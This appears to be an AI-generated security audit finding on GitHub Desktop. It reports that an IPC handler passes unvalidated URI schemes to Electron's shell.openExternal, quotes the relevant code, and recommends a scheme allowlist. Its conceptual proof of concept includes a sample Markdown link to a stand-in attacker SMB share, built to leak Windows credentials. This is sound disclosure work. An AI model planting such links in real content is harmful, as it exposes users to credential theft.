### Title
Unvalidated URI scheme passed to `shell.openExternal` from renderer-controlled/repository-derived links - ([File: app/src/main-process/main.ts])

### Summary
The external report's broken invariant is: an operation that hands off control to an outside entity (an ERC721 recipient contract) is performed with a "raw" call (`transferFrom`) instead of the safety-checked variant (`safeTransferFrom`), and no validation/guard exists around what the recipient does with that control. The Desktop analog is `shell.openExternal`/`openPath`, which hands off control to the OS shell/URL handler for an arbitrary string with only a superficial `http(s)://` check for logging, and no scheme allowlist before invocation.

### Finding Description
The main-process IPC handler `open-external` accepts an arbitrary string from the renderer and passes it straight to Electron's `shell.openExternal`, only inspecting the scheme to decide whether to log it — not to validate or restrict it: [1](#0-0) 

This handler is exposed to the renderer via `openExternal` in `main-process-proxy.ts`/`app-shell.ts`, and is invoked from many UI surfaces that render attacker-influenced content, e.g. Markdown links in release notes and other rendered text: [2](#0-1) [3](#0-2) 

`app-shell.ts` itself documents the safety expectation for the *file*-opening variants ("Do not use this method with non-validated paths") but the `openExternal` entry point carries no such contract or runtime enforcement: [4](#0-3) 

There is no allowlist of schemes (e.g., restricting to `http:`/`https:`/`mailto:`) anywhere along this path. `shell.openExternal` in Electron is well known to be capable of invoking arbitrary registered OS URI handlers (`file:`, custom app protocols, `smb://`, etc.), which historically has been used for RCE or credential-leak primitives when applications pass untrusted strings to it without validating the scheme.

### Impact Explanation
Any surface in Desktop that renders untrusted text and turns it into a clickable link/URI that eventually reaches `shell.openExternal` (Markdown in READMEs/PR descriptions/commit messages/issue content pulled from a malicious repository or the GitHub API) could be leveraged to invoke an arbitrary OS protocol handler chosen by the attacker rather than a normal web link. Depending on what protocol handlers are registered on the victim's machine, this can range from unexpected local application launches to remote file execution or credential exfiltration (e.g. `file://\\attacker-smb-share\...` prompting NTLM auth leak on Windows) — i.e., code execution or credential exfiltration outside the repo, triggered purely by the victim clicking a link that originated from attacker-controlled repository content, satisfying the "link the user clicks" / "GitHub API object" attacker model in scope.

### Likelihood Explanation
Likelihood is moderate: it requires the user to click a link, and Electron's own OS-level mitigations (e.g., prompts before launching some external protocol handlers) provide partial mitigation on some platforms. However, no defense-in-depth (scheme allowlist) exists in Desktop's own code before calling into Electron, so the entire safety burden rests on Electron/OS behavior. This mirrors the audited PoolTogether pattern: the "unsafe" primitive is used directly, and the report's own resolution (respect the interface / add the safety check) is exactly what's missing here — a scheme validation step before handing control to the OS.

### Recommendation
Add a scheme allowlist (e.g., `http:`, `https:`, `mailto:`) inside the `open-external` IPC handler in `app/src/main-process/main.ts` before calling `shell.openExternal`, rejecting any other scheme (`file:`, custom protocol handlers, UNC-style paths) similar to the safeguard pattern the ERC721 report recommends (perform the "safe" check before handing off control), while still avoiding turning this into a DoS by simply rejecting/logging disallowed schemes rather than throwing unhandled errors.

### Proof of Concept
Conceptual PoC (not executed, based on static code reading):
1. Attacker crafts a public repository whose README, commit message, PR description, or an object surfaced via the GitHub API contains a Markdown link such as `[Update Photo](file://\\attacker-server\share\payload)` or a link using a custom registered protocol handler present on many Windows systems.
2. Victim clones/views this content in GitHub Desktop; the Markdown renderer turns it into a clickable link (e.g., via `LinkButton`/`release-notes-dialog.tsx`, or an equivalent renderer path for repository content).
3. Victim clicks the link. The renderer calls `openExternal(uri)` → IPC `open-external` → `shell.openExternal(path)` in `app/src/main-process/main.ts:581-597`, with no scheme validation performed beyond the `http(s)` logging check.
4. Electron/the OS resolves the URI/path via the registered handler for that scheme, potentially triggering credential leakage (SMB auth) or launching another registered application with attacker-controlled arguments.

Note: I could not find (within index limits) the exact renderer component that converts arbitrary GitHub API/repository Markdown content (e.g., README bodies fetched from the GitHub API) into `LinkButton`/`openExternal` calls, so the "attacker controls the exact link text end-to-end" step is inferred from the general Markdown-rendering + `LinkButton`/`openExternal` pattern found in the codebase rather than a single fully-traced file. Confirming the precise Markdown-rendering entry point would benefit from a full Devin session with complete file access, since the index has size limits that may exclude some renderer/Markdown files.

### Citations

**File:** app/src/main-process/main.ts (L581-597)
```typescript
  ipcMain.handle('open-external', async (_, path: string) => {
    const pathLowerCase = path.toLowerCase()
    if (
      pathLowerCase.startsWith('http://') ||
      pathLowerCase.startsWith('https://')
    ) {
      log.info(`opening in browser: ${path}`)
    }

    try {
      await shell.openExternal(path)
      return true
    } catch (e) {
      log.error(`Call to openExternal failed: '${e}'`)
      return false
    }
  })
```

**File:** app/src/ui/release-notes/release-notes-dialog.tsx (L206-208)
```typescript
  private onMarkdownLinkClicked = (url: string) => {
    shell.openExternal(url)
  }
```

**File:** app/src/ui/lib/link-button.tsx (L76-92)
```typescript
  private onClick = (event: React.MouseEvent<HTMLAnchorElement>) => {
    event.preventDefault()

    if (this.props.disabled) {
      return
    }

    const uri = this.props.uri
    if (uri) {
      shell.openExternal(uri)
    }

    const onClick = this.props.onClick
    if (onClick) {
      onClick()
    }
  }
```

**File:** app/src/lib/app-shell.ts (L12-53)
```typescript
export interface IAppShell {
  readonly moveItemToTrash: (path: string) => Promise<void>
  readonly beep: () => void
  readonly openExternal: (path: string) => Promise<boolean>
  /**
   * Reveals the specified file using the operating
   * system default application.
   * Do not use this method with non-validated paths.
   *
   * @param path - The path of the file to open
   */

  readonly openPath: (path: string) => Promise<string>
  /**
   * Reveals the specified file on the operating system
   * default file explorer. If a folder is passed, it will
   * open its parent folder and preselect the passed folder.
   *
   * @param path - The path of the file to show
   */
  readonly showItemInFolder: (path: string) => void
  /**
   * Reveals the specified folder on the operating
   * system default file explorer.
   * Do not use this method with non-validated paths.
   *
   * @param path - The path of the folder to open
   */
  readonly showFolderContents: (path: string) => void
}

export const shell: IAppShell = {
  // Since Electron 13, shell.trashItem doesn't work from the renderer process
  // on Windows. Therefore, we must invoke it from the main process. See
  // https://github.com/electron/electron/issues/29598
  moveItemToTrash,
  beep: electronShell.beep,
  openExternal,
  showItemInFolder,
  showFolderContents,
  openPath: electronShell.openPath,
}
```
